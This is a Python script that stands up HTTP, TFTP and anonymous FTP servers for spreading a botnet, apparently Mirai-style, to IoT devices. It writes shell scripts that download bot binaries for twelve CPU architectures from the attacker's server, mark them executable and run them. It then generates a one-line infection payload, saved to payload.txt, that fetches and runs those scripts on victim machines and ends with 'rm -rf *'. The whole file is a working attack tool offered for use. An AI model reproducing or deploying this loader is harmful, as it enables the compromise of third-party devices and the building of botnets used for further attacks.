import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "juliana707"
exec_name = "bot.julie707"
bin_prefix = "0scar."
bin_directory = "bins"
archs = [
"x86",                        #1
"mips",                       #2
"mpsl",                       #3
"arm",                        #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4",                        #10
"spc",                        #11
"arc"                     #12
]                        



def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[0;31mSetting up...")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\033[0;31mCreating your payload.")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/web-api.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/web-api.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/web-api.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/web-api2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/web-api2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/web-api2.sh')

run('echo "#!/bin/bash" > /var/ftp/web-api1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/web-api1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/web-api1.sh')

run('echo "#!/bin/bash" > /var/www/html/web-api.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/www/html/web-api.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/web-api1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/web-api.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/web-api2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;33mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/web-api.sh; curl -O http://" + ip + "/web-api.sh; chmod 777 web-api.sh; sh web-api.sh; tftp " + ip + " -c get web-api.sh; chmod 777 web-api.sh; sh web-api.sh; tftp -r web-api2.sh -g " + ip + "; chmod 777 web-api2.sh; sh web-api2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " web-api1.sh web-api1.sh; sh web-api1.sh; rm -rf web-api.sh web-api.sh web-api2.sh web-api1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/web-api.sh; curl -O http://" + ip + "/web-api.sh; chmod 777 web-api.sh; sh web-api.sh; tftp " + ip + " -c get web-api.sh; chmod 777 web-api.sh; sh web-api.sh; tftp -r web-api2.sh -g " + ip + "; chmod 777 web-api2.sh; sh web-api2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " web-api1.sh web-api1.sh; sh web-api1.sh; rm -rf web-api.sh web-api.sh web-api2.sh web-api1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[0;33mYour payload has been generated and saved in payload.txt\033[0m")
